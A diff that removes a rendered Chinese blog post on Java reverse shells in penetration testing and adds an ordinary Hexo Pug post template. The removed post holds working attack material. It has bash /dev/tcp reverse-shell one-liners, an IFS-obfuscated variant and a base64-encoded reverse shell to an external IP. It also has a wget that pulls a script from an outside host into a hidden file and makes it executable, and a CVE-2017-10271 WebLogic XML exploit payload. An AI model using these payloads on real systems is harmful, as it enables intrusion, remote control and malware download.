@@ -1,474 +1,102 @@
-<!DOCTYPE html>
-<html lang="zh-cmn-Hans">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="纯净水@流云-自留地">
-    <link rel="shortcut icon" href="http://some.url/to/favicon.ico">
-    <title>java反弹shell-Adagio</title>
-    
+extends includes/layout.pug
+
+block top_img
+  - var top_img =  page.top_img || page.cover || theme.post_meta.top_img || theme.default_top_img
+  - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
+  div#top-container(style=bg_img)
+    #post-info
+      #post-title
+          .posttitle= page.title || _p('no_title')
+      #post-meta
+        if (theme.post_meta.date_type)
+          if (theme.post_meta.date_type === 'both')
+            time.post-meta__date
+              i.fa.fa-calendar.fa-fw(aria-hidden="true")
+              =' '+_p('post.created')+' '+date(page.date, config.date_format)
+              span.post-meta__separator |
+              i.fa.fa-history.fa-fw(aria-hidden="true")
+              =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
+          else
+            - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
+            time.post-meta__date #[i.fa.fa-calendar.fa-fw(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+                  
+        if (theme.post_meta.categories && page.categories.data.length > 0)
+          if (theme.post_meta.date_type)
+            span.post-meta__separator |
+          span
+            each item, index in page.categories.data
+              i.fa.fa-inbox.post-meta__icon.fa-fw(aria-hidden="true")
+              a(href=url_for(item.path)).post-meta__categories #[=item.name]
+              if (index < page.categories.data.length - 1)
+                i.fa.fa-angle-right.fa-fw(aria-hidden="true")
+        .post-meta-wordcount
+          if (theme.wordcount && theme.wordcount.enable)
+            i.fa.fa-file-word-o.post-meta__icon.fa-fw(aria-hidden="true")
+            span= _p('post.wordcount') + ':'
+            span.word-count= wordcount(page.content)
+            span.post-meta__separator |
+            i.fa.fa-clock-o.post-meta__icon.fa-fw(aria-hidden="true")
+            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+          .post-meta-pv-cv
+            if (theme.wordcount && theme.wordcount.enable && theme.busuanzi.page_pv)
+              span.post-meta__separator |
+            if theme.busuanzi.page_pv       
+              span
+                i.fa.fa-eye.post-meta__icon.fa-fw(aria-hidden="true") 
+                =_p('post.page_pv') + ':'
+              span#busuanzi_value_page_pv
+            if (theme.disqus && theme.disqus.enable && theme.disqus.count && page.comments !== false)
+              if (theme.busuanzi && theme.busuanzi.page_pv)
+                span.post-meta__separator |
+              i.fa.fa-comment-o.post-meta__icon.fa-fw(aria-hidden="true")
+              span= _p('post.comments') + ':'
+              a(href=url_for(page.path) + '#post-comment')
+                span.disqus-comment-count(data-disqus-url=page.permalink)
+            if (theme.valine && theme.valine.enable && theme.valine.count && page.comments !== false)
+              if (theme.busuanzi && theme.busuanzi.page_pv)
+                span.post-meta__separator |
+              i.fa.fa-comments-o.post-meta__icon.fa-fw(aria-hidden="true")
+              span= _p('post.comments') + ':'
+              a(href=url_for(page.path) + '#post-comment' itemprop="discussionUrl")
+                span.valine-comment-count.comment-count(data-xid=url_for(page.path) itemprop="commentCount")
+            if (theme.gitalk && theme.gitalk.enable && theme.gitalk.count && page.comments !== false)
+              if (theme.busuanzi && theme.busuanzi.page_pv)
+                span.post-meta__separator |
+              i.fa.fa-comments-o.post-meta__icon.fa-fw(aria-hidden="true")
+              span= _p('post.comments') + ':'
+              a(href=url_for(page.path) + '#post-comment')
+                span.gitalk-comment-count.comment-count
+
+
+block content
+  article#post(class="")
+    #post-content.article-container!= page.content
+  if (theme.post_copyright && theme.post_copyright.enable && page.copyright != false)
+    .post-copyright
+      .post-copyright__author
+        span.post-copyright-meta= _p('post.copyright.author') + ": "
+        span.post-copyright-info
+          a(href=`mailto:${config.email}`) #[=config.author]
+      .post-copyright__type
+        span.post-copyright-meta= _p('post.copyright.link') + ": "
+        span.post-copyright-info
+          a(href=url_for(page.permalink)) #[=page.permalink]
+      .post-copyright__notice
+        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
+        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
+  
+  .tag_share
+    if (theme.post_meta.tags)
+      .post-meta__tag-list
+        each item, index in page.tags.data
+          a(href=url_for(item.path)).post-meta__tags #[=item.name]    
+    include includes/share/index.pug
         
-            <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-            <link href="https://cdn.bootcss.com/academicons/1.8.6/css/academicons.min.css" rel="stylesheet">
-            <link href="https://cdn.bootcss.com/font-awesome/5.9.0/css/all.min.css" rel="stylesheet">
-            <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
-        
-    
-    <link rel="stylesheet" href="/css/adagio.css">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
-<body>
-    <div class="container-fluid">
-    <nav class="nav">
-        <div class="collapse navbar-collapse" id="navbar-sm">
-            
-            
-            <div class="navbar-nav">
-                <a href="https://hexo.io" class="nav-item nav-link">Hexo</a>
-            </div>
-            
-            <div class="navbar-nav">
-                <a href="http://www.hanlindong.com" class="nav-item nav-link">Adagio's author</a>
-            </div>
-            
-        </div>
-    </nav>
-</div>
-
-<div class="d-flex d-md-none" style="width: 100%; background-color: #e9ecef">
-    
-    <div class="nav">
-        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbar-sm"
-            aria-expanded="false" aria-label="Toggle Navigation">
-            <i class="fas fa-bars fa-lg"></i>
-        </button>
-    </div>
-    
-    <nav class="navbar ml-auto">
-        <a class="navbar-brand" href="/">
-            
-            <img class="logo" src="https://via.placeholder.com/100x50.png?text=logo" />
-            
-        </a>
-    </nav>
-</div>
-
-
-<div class="container d-none d-md-block my-navbar">
-    <nav class="navbar navbar-expand-sm navbar-light bg-transparent">
-        <a class="navbar-brand " href="/">
-            
-            <img class="logo" src="https://via.placeholder.com/100x50.png?text=logo" />
-            
-        </a>
-        
-        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
-            aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
-            <span class="navbar-toggler-icon"></span>
-        </button>
-        <div class="collapse navbar-collapse" id="navbarNav">
-            <ul class="navbar-nav">
-                
-                <li class="nav-item pl-2 pr-2 ">
-                    <a class="nav-link" href="https://hexo.io">Hexo</a>
-                </li>
-                
-                <li class="nav-item pl-2 pr-2 ">
-                    <a class="nav-link" href="http://www.hanlindong.com">Adagio's author</a>
-                </li>
-                
-            </ul>
-        </div>
-        
-    </nav>
-</div>
-
-
-
-
-    <div class="jumbotron jumbotron-fluid">
-    <div class="container">
-        
-        <h1 class="mt-4 article-title page-title">java反弹shell</h1>
-        
-        <p class="lead text-gray mt-3">By Anonymous; Published on 2020-01-13</p>
-        
-        <div class="tags">
-            <ul class="tag-list">
-                
-                <li class="tag-list-item">
-                    <a class="tag-list-link" href="/tags/web 渗透/">web 渗透</a>
-                </li>
-                
-                <li class="tag-list-item">
-                    <a class="tag-list-link" href="/tags/java反序列化/">java反序列化</a>
-                </li>
-                
-                <li class="tag-list-item">
-                    <a class="tag-list-link" href="/tags/java反弹shell/">java反弹shell</a>
-                </li>
-                
-            </ul>
-        </div>
-        
-    </div>
-</div>
-    <div class="container">
-        <div class="row">
-            <div class="col-md-9 pt-2">
-                <div class="row">
-                    <div class="col-12">
-                        <main>
-                            <article class="article-text page-content"><h1 id="java-反弹shell"><a href="#java-反弹shell" class="headerlink" title="java 反弹shell"></a>java 反弹shell</h1><p>[TOC]</p>
-<p>在渗透测试中，偶尔会遇到目标为java环境下的RCE，其中java命令执行的函数比较常见的分为Runtime和Process的类。这里遇到的坑以及解决方法。</p>
-<h2 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h2><p>这里主要涉及 <code>Runtime.getRuntime().exec()</code><br>测试用例如下：</p>
-<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span>  java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">;</span>
-<span class="token keyword">import</span>  java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Process<span class="token punctuation">;</span>
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">exec</span> <span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token keyword">try</span><span class="token punctuation">{</span>
-            Runtime rt  <span class="token operator">=</span>   Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            String<span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"th9bvw.ceye.io"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-            Process pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"11111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>
-            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
-        exec e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<h3 id="管道符号"><a href="#管道符号" class="headerlink" title="管道符号"></a>管道符号</h3><p>在遇到对渗透目标执行重定向或者pipeline的时候，对应符号不会被解析，重定向或管道符号失效。解析如下：</p>
-<pre><code>ls /tmp/ | grep xx
-</code></pre><p>这个时候 该程序中管道符号被视为普通字符</p>
-<pre><code>ls &quot;/tmp&quot; &quot;|&quot; &quot;grep&quot; &quot;xx&quot;
-</code></pre><p>比如遇到以下环境：</p>
-<ul>
-<li>weblogic 漏洞 在执行weblogic RCE中，对其进行测试并使其载入远程服务器上面的木马时，需要满足条件如下：</li>
-<li>命令执行，载入下载程序并执行下载程序，在这个时候命令如下：</li>
-</ul>
-<pre><code>cmd = &quot;wget http://th9bvw.ceye.io/down_v2_1.sh -q -O /tmp/.font-unixx &amp;&amp; chmod +x /tmp/.font-unixx &amp;&quot;
-</code></pre><p>直接执行该命令，会发现&amp;&amp;后的语句并没有成功执行，这个时候就要执行以下方法了,以数组方法执行，详情参照<code>exec</code> 的重载</p>
-<h4 id="linux目标"><a href="#linux目标" class="headerlink" title="linux目标"></a>linux目标</h4><p>在linux下，常用方法（注意下，这里执行的时候，/bin/sh会以sh shell执行，/bin/bash会以bash执行，具体看怎么调用</p>
-<pre><code>String[] command = { &quot;/bin/sh&quot;, &quot;-c&quot;, cmds };
-Process ps = Runtime.getRuntime().exec(command );
-</code></pre><p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15691675380880.jpg" alt=""><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15691675525950.jpg" alt=""></p>
-<pre><code>sh -c 作用说明:
-让调用的bash 将一个字符串作为完整的命令来执行
-</code></pre><p>常用反弹shell</p>
-<ul>
-<li><p>sh</p>
-<pre><code>/bin/bash -c &#39;sh -i &gt;&amp; /dev/tcp/127.0.0.1/9999 0&gt;&amp;1&#39;
-</code></pre><p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706367303103.jpg" alt="-w331"></p>
-</li>
-<li><p>bash</p>
-<pre><code>/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/127.0.0.1/9999 0&gt;&amp;1&#39;
-</code></pre><p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706367647957.jpg" alt="-w341"></p>
-</li>
-</ul>
-<p>这里备注下 OSX系统中存在多种shell<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706369208934.jpg" alt="-w562"><br>因为常用的shell 是zsh ，所以遇到多种情况有点坑，应该是环境变量没配好<br>如 以下命令：<br>在zsh中<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706370741721.jpg" alt="-w562"></p>
-<p>在bash中：<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371257635.jpg" alt="-w531"></p>
-<p>在sh中:<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371690653.jpg" alt="-w987"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371954883.jpg" alt="-w901"></p>
-<h4 id="windows目标"><a href="#windows目标" class="headerlink" title="windows目标"></a>windows目标</h4><p>在windows下，常用方法</p>
-<pre><code>String[] command = { &quot;cmd&quot;, &quot;/c&quot;, cmds };
-Process ps = Runtime.getRuntime().exec(command );
-</code></pre><p>综上 即命令中涉及 <code>&lt;  &gt;  |  &amp;</code>等符号时<br><code>getRuntime().exec(String command )</code>此时已不适用，可以尝试<br><code>exec(String [] cmdArray) 
- exec(String []cmdarray,String []envp,File dir)</code>来执行</p>
-<p> 但当遇到的命令执行的点是<code>getRuntime().exec(String command )</code>，此时这些绕过方法即不适用了。涉及到 <code>bypass exec</code> </p>
-<h2 id="bypass-exec"><a href="#bypass-exec" class="headerlink" title="bypass exec"></a>bypass exec</h2><h3 id="IFS"><a href="#IFS" class="headerlink" title="IFS"></a>IFS</h3><p>Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell 中使用。</p>
-<pre><code> 而 IFS 是一种 set 变量，当 shell 处理&quot;命令替换&quot;和&quot;参数替换&quot;时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。
-</code></pre><p>————————————————<br>版权声明：本文为CSDN博主「whuslei」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/whuslei/article/details/7187639" target="_blank" rel="noopener">https://blog.csdn.net/whuslei/article/details/7187639</a></p>
-<p>查看其值<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704628317663.jpg" alt="-w308"></p>
-<p>“040”是空格，”011”是Tab，”012”是换行符”\n”<br>即简单来说 IFS可以替代 空格<br>在这里用来绕过尝试：<br>跟踪exec：<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629198309.jpg" alt="-w988"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629353562.jpg" alt="-w1065"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629504206.jpg" alt="-w1084"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629694526.jpg" alt="-w600"><br>这里可以明显看到 IFS起到了分隔符的作用<br>正常情况下<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706878745671.jpg" alt="-w430"><br>这样传入参数是可以执行的<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706884565379.jpg" alt="-w844"></p>
-<p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706889154267.jpg" alt="-w1128"></p>
-<p>但是一个比较坑的事，在mac中bash 使用IFS没有反弹shell，但在centos中就可以使用,猜测是osx的环境变量有问题。<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704643120846.jpg" alt="-w960"></p>
-<p>经测试，改用osx的shell环境 可以执行</p>
-<pre><code>/bin/bash -c bash${IFS}-i${IFS}&gt;&amp;${IFS}/dev/tcp/127.0.0.1/8888&lt;&amp;1
-</code></pre><p>centos中的反应<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704643290042.jpg" alt="-w487"></p>
-<h3 id="命令执行base64编码"><a href="#命令执行base64编码" class="headerlink" title="命令执行base64编码"></a>命令执行base64编码</h3><p>在java反序列化中可能遇上反序列化命令执行中存在转义的现象，这个时候可以使用base64编码进行绕过</p>
-<pre><code>cmd = &quot;{echo,%s}|{base64,-d}|{bash,-i}&quot; %base64.b64encode(cmd)
-
-String[] commands = {&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=}|{base64,-d}|{bash,-i}&quot;}
-</code></pre><h4 id="反序列化示例"><a href="#反序列化示例" class="headerlink" title="反序列化示例"></a>反序列化示例</h4><h3 id="xml执行绕过"><a href="#xml执行绕过" class="headerlink" title="xml执行绕过"></a>xml执行绕过</h3><p>这里遇到在反序列化存在于xml中的时候，在用到管道符等时要用实体编码进行绕过处理</p>
-<h4 id="利用实例-CVE-2017-10271"><a href="#利用实例-CVE-2017-10271" class="headerlink" title="利用实例 CVE-2017-10271"></a>利用实例 CVE-2017-10271</h4><p>该漏洞利用poc如下：</p>
-<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
-      &lt;soapenv:Header&gt;
-        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
-          &lt;java&gt;
-            &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
-              &lt;array class=&quot;java.lang.String&quot; length=&quot;2&quot;&gt;
-                &lt;void index=&quot;0&quot;&gt;
-                  &lt;string&gt;/bin/bash&lt;/string&gt;
-                &lt;/void&gt;
-                &lt;void index=&quot;1&quot;&gt;
-                  &lt;string&gt;-c&lt;/string&gt;
-                &lt;/void&gt;
-                &lt;void index=&quot;2&quot;&gt;
-                  &lt;string&gt;&#39;&#39;&#39;+cmd+&#39;&#39;&#39;&lt;/string&gt;
-                &lt;/void&gt;
-              &lt;/array&gt;
-              &lt;void method=&quot;start&quot;/&gt;
-            &lt;/void&gt;
-          &lt;/java&gt;
-        &lt;/work:WorkContext&gt;
-      &lt;/soapenv:Header&gt;
-      &lt;soapenv:Body/&gt;
-    &lt;/soapenv:Envelope&gt;
-</code></pre><p>其中在cmd中传入字符串的时候需要进行编码，否则会进行报错<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699933180870.jpg" alt="-w1437"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699934142704.jpg" alt="-w1437"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699937854703.jpg" alt="-w878"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699938012054.jpg" alt="-w513"></p>
-<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>wget http://th9bvw.ceye.io -o /tmp/.test12.sh <span class="token entity" title="&amp;">&amp;amp;</span><span class="token entity" title="&amp;">&amp;amp;</span>  chmod +x /tmp/.test12.sh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>
-</code></pre>
-<p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699981292782.jpg" alt="-w673"></p>
-<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>在测试中遇到在上传执行脚本时，发现系统上不存在wget、curl等命令，即无法直接通过shell 脚本进行云端下载请求，可以尝试使用Bash /dev/tcp 进行文件传输：</p>
-<p>通过 bash直接建立socket请求（待测试）</p>
-<pre class=" language-shell"><code class="language-shell">exec 8<>/dev/tcp/127.0.0.1/11211    
-#使用文件描述符8以<>(<读>写)方式，打开127.0.0.1的tcp11211端口
-ls -l /proc/self/fd                                   
-#查看打开的连接8
-echo -e "stats" >&8                             
-#向socket写入数据
-cat <&8                                                  
-#从socket读入数据
-exec 8<&-                                              
-#关闭socket读
-exec 8>&-                                              
-#关闭socket写
-</code></pre>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">编码转换</a><br><a href="https://paper.seebug.org/834/" target="_blank" rel="noopener">红队后渗透测试中的文件传输技巧</a></p>
-<p><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/" target="_blank" rel="noopener">绕过exec获取反弹shell</a><br><a href="https://www.cnblogs.com/leixiao-/p/10216571.html" target="_blank" rel="noopener">bash扩展</a></p>
-</article>
-                        </main>
-                        
-                        
-                    </div>
-                </div>
-                <div class="row mt-5 mb-5">
-                    <div class="col-12">
-                        <div class="row">
-    <div class="col">
-        <nav aria-label="paginator" class="paginator">
-            <ul class="pagination d-none d-md-flex pagination-lg justify-content-center">
-                <li class="page-item ">
-                    <a class="page-link"
-                        href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/"
-                        aria-label="Previous">
-                        <span aria-hidden="true">&laquo;
-                            jackson反序列化漏洞_1</span>
-                        <span class="sr-only">Previous</span>
-                    </a>
-                </li>
-                <li class="page-item ">
-                    <a class="page-link"
-                        href="/2019/12/13/Web渗透/java反序列化/java_sql注入/"
-                        aria-label="Next">
-                        <span
-                            aria-hidden="true">java sql注入
-                            &raquo;</span>
-                        <span class="sr-only">Next</span>
-                    </a>
-                </li>
-            </ul>
-            <ul class="pagination d-md-none justify-content-center">
-                <li class="page-item ">
-                    <a class="page-link"
-                        href="/2020/01/13/Web渗透/java反序列化/jackson反序列化漏洞_1/"
-                        aria-label="Previous">
-                        <span aria-hidden="true">&laquo;
-                            jackson反序列化漏洞_1</span>
-                        <span class="sr-only">Previous</span>
-                    </a>
-                </li>
-                <li class="page-item ">
-                    <a class="page-link"
-                        href="/2019/12/13/Web渗透/java反序列化/java_sql注入/"
-                        aria-label="Next">
-                        <span
-                            aria-hidden="true">java sql注入
-                            &raquo;</span>
-                        <span class="sr-only">Next</span>
-                    </a>
-                </li>
-            </ul>
-        </nav>
-    </div>
-</div>
-
-
-
-                    </div>
-                </div>
-                <div class="row">
-                    <div class="col-12">
-                        <div id="vcomment"></div>
-                    </div>
-                </div>
-            </div>
-            <div class="col-md-3">
-                <div class="container pt-4 page-sidebar">
-                    
-                    <div class="row">
-    <div class="col">
-        <h6>APPLAUSE FOR ME</h6>
-        <div id="applause-easy"></div>
-    </div>
-</div>
-                    
-                    <hr class="row">
-                    <div class="row toc-container">
-                        <div class="col-12">
-                            <h6>NAVIGATION</h6>
-                            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java-反弹shell"><span class="toc-text">java 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#runtime"><span class="toc-text">runtime</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#管道符号"><span class="toc-text">管道符号</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#linux目标"><span class="toc-text">linux目标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#windows目标"><span class="toc-text">windows目标</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-exec"><span class="toc-text">bypass exec</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IFS"><span class="toc-text">IFS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行base64编码"><span class="toc-text">命令执行base64编码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#反序列化示例"><span class="toc-text">反序列化示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xml执行绕过"><span class="toc-text">xml执行绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用实例-CVE-2017-10271"><span class="toc-text">利用实例 CVE-2017-10271</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件传输"><span class="toc-text">文件传输</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <footer>
-    <div class="jumbotron jumbotron-fluid mb-0">
-        <div class="container-fluid">
-            <div class="col text-center">
-                <div class="bottom-social">
-                    <div class="row">
-    <div class="col text-center">
-        <ul class="list-inline">
-            
-            <li class="list-inline-item">
-                
-                <a href="https://github.com/xxxxx">
-                    <span class="fa-stack fa-2x icon-link">
-                        <i class="fas fa-circle fa-stack-2x"></i>
-                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
-                    </span>
-                </a>
-                
-            </li>
-            
-            <li class="list-inline-item">
-                
-                <a href="https://www.facebook.com/xxxxx">
-                    <span class="fa-stack fa-2x icon-link">
-                        <i class="fas fa-circle fa-stack-2x"></i>
-                        <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
-                    </span>
-                </a>
-                
-            </li>
-            
-            <li class="list-inline-item">
-                
-                <a href="https://www.pinterest.com/xxxxx">
-                    <span class="fa-stack fa-2x icon-link">
-                        <i class="fas fa-circle fa-stack-2x"></i>
-                        <i class="fab fa-pinterest-p fa-stack-1x fa-inverse"></i>
-                    </span>
-                </a>
-                
-            </li>
-            
-            <li class="list-inline-item">
-                
-                <a href="https://www.linkedin.com/in/xxxxx">
-                    <span class="fa-stack fa-2x icon-link">
-                        <i class="fas fa-circle fa-stack-2x"></i>
-                        <i class="fab fa-linkedin-in fa-stack-1x fa-inverse"></i>
-                    </span>
-                </a>
-                
-            </li>
-            
-        </ul>
-    </div>
-</div>
-
-                </div>
-                <p class="copyright text-muted">
-                    Copyright &copy; 吾善养浩然气
-                    <br>
-                    Thanks for coming!
-                    <br>
-                    <a href="https://github.com/Hanlin-Dong/hexo-theme-adagio">Adagio</a> - A <a href="https://hexo.io">Hexo</a> theme made with love by
-                    <a href="http://www.hanlindong.com">Hanlin Dong</a>.
-                </p>
-            </div>
-        </div>
-    </div>
-</footer>
-
-    
-    
-        <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.slim.min.js"></script>
-        <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-        <script src="https://cdn.bootcss.com/font-awesome/5.9.0/js/all.min.js"></script>
-         
-            <script type="text/x-mathjax-config">
-                MathJax.Hub.Config({
-                    CommonHTML: { linebreaks: { automatic: true } },
-                    "HTML-CSS": { linebreaks: { automatic: true } },
-                    SVG: { linebreaks: { automatic: true } }
-                });
-            </script>
-            <script src='https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>
-        
-    
-
-
-<script src="/js/av.min.js"></script>
-<script src="/js/valine.min.js"></script>
-<script src="/js/applause-easy.js"></script>
-
-<script>
-$(document).ready(function() {
-    var a = new ApplauseEasy({
-        id: 'applause-easy',
-        appId: "xxxxxxxxxx",
-        appKey: "xxxxxxxxxx",
-        img_src: "http://img.hanlindong.com/blog/site/clap.png",
-        img_width: "50px",
-        img_height: "50px"
-    })
-})
-</script>
-
-
-<script>
-    var _hmt = _hmt || [];
-    (function () {
-        var hm = document.createElement("script");
-        hm.src = "https://hm.baidu.com/hm.js?123456789";
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(hm, s);
-    })();
-</script>
-
-
-
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-11111111-1"></script>
-<script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag() {
-        dataLayer.push(arguments);
-    }
-    gtag('js', new Date());
-    gtag('config', 'UA-11111111-1');
-</script>
-
-
-    
-    <script>
-    new Valine({
-        el: "#vcomment",
-        appId: "xxxxxxxxxx",
-        appKey: "xxxxxxxxxx",
-        notify: false,
-        varify: false,
-        avatar: 'identicon',
-        placeholder: "",
-        recordIP: true
-    })
-</script>
-    
-</body>
-</html>
+  if theme.reward.enable
+    include includes/reward.pug
+  include includes/pagination.pug
+  
+  if theme.related_post && theme.related_post.enable
+    != related_posts(page,site.posts)
+  if page.comments !== false
+    include includes/comments/index.pug
